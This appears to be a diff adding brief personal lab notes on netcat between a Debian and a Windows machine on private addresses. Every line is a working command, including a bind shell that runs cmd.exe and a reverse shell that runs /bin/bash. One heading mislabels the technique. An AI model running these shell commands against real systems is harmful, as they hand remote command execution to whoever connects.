@@ -1,0 +1,13 @@
+apt install netcat
+netcat -lvvp 4444
+#go win 
+nc>nc -vv 192.168.80.101(deb ip) 4444
+
+**bind shell	
+nc -lvvp 4444 -e cmd.exe (in win)	
+nc -vv 192.168.80.102 (win ip) 4444 (in deb)
+
+**reverse bind shell	
+deb:- nc -vv 192.168.80.102 4444 -e /bin/bash
+
+win:- nc -lvvp 4444
